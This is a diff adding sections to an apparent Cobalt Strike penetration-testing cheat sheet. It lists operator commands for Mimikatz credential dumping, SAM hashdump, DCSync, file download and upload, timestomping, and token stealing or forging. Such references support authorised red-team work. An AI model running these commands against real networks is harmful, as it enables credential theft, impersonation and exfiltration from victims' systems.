@@ -64,3 +64,46 @@ spawn [TCP-Listner-Name]                    ; Spawning a peer-to-peer ("P2P") TC
                                             ; TCP beacons can be also run locally by clicking "Bind to localhost only" on GUI
 inject [PID] [x86|x64] [TCP-Listner-Name]   ; Useful when trying to spawn P2P beacon as different user context
 ```
+#### Credentials and Hashes
+```
+logonpasswords                              ; Run Mimikatz
+hashdump                                    ; Get SAM database hashes
+```
+
+#### Mimikatz
+```
+mimikatz [command] [args]                   ; Runs a Mimikatz command
+mimikatz ![command] [args]                  ; Elevate to SYSTEM and run Mimikatz command
+mimikatz @[command] [args]                  ; User current token to run Mimikatz command
+```
+#### DCSync
+```
+dcsync [domain] [DOMAIN\user]
+```
+
+#### File Download
+```
+download [file]
+cancel [file|*]
+downloads
+View --> Downloads --> Sync Files
+```
+
+### File Upload
+```
+upload [/path/to/file]
+timestomp [Destination] [Source]            ; Changing file's timestamps (*Do not recommend using it during the engagement) 
+```
+
+### Token Stealing
+```
+ps                                          ; List process
+steal_token [PID]                           ; Stealing token
+getuid                                      ; Identify/confirm who you are
+rev2self                                    ; Drop/revoke token
+
+spawnas DOMAIN\user password                ; Spawn a beacon w/ alternative creds
+make_token DOMaIN\user password             ; Create a token. So when you do a make_token, when you do 'whoami' you will 
+                                            ; still see your current user account; however, if you do a remote 'whoami' 
+                                            ; (maybe against DC) you will see that the maked token user.
+```
